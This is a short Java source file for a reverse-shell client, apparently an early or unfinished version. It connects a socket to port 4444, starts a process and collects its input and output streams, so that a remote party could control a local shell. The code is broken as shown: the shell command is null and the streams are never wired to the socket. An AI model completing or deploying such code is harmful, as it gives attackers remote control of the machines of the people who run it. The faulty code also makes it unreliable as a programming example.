package dev.drzymala.reversesheller;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClientReverseShell {

    public static void main(String[] args) throws IOException {

        connect();
    }

    private static void connect() throws IOException {

        Process remoteShell;
        byte[] buffer = new byte[1024];
        InetSocketAddress serverAddress = new InetSocketAddress("0.0.0.0", 4444);

        try {
            String prompt = null;
            Socket client = new Socket();
            client.connect(serverAddress);
            remoteShell = new ProcessBuilder(prompt).redirectInput(ProcessBuilder.Redirect.PIPE)
                    .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
            OutputStream stdin = remoteShell.getOutputStream();
            InputStream stdout = remoteShell.getInputStream();
            InputStream stderr = remoteShell.getErrorStream();

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
